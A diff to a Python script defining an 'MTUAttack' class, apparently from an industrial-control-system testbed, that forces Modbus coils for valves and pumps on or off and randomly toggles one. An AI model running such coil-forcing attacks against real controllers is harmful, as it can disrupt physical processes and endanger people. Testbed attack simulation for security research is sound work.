@@ -1,9 +1,10 @@
 import logging
 import argparse
 import os
+import random
 
 from pymodbus.client.sync import ModbusTcpClient
-from pyics.mtu import MTU, ProcessRange
+from pyics.mtu import MTU
 from pyics.utils import *
 from constants import *
 
@@ -46,15 +47,24 @@ class MTUAttack(MTU):
 
     def main_loop(self, *args, **kwargs):
         self.change_coil(WM, True)
-        self.change_coil(M1, True)
-        self.change_coil(M2, True)
+        self.change_coil(VTC, True)
+        self.change_coil(VTF, False)
+        self.change_coil(V1, True)
+        self.change_coil(V2, True)
+        num = random.randint(0, 5)
+        if num == 5:
+            self.change_coil(VT1, True)
+        else:
+            self.change_coil(VT1, False)
+        
+
 
 
 def main(args):
-    time.sleep(5)
+    time.sleep(15)
     mtu = MTUAttack(args.ip, args.port)
     mtu.target_vars(args.filename)
-    
+
     mtu.create_task('mtu', args.period, args.duration)
     mtu.start()
     mtu.wait_end()
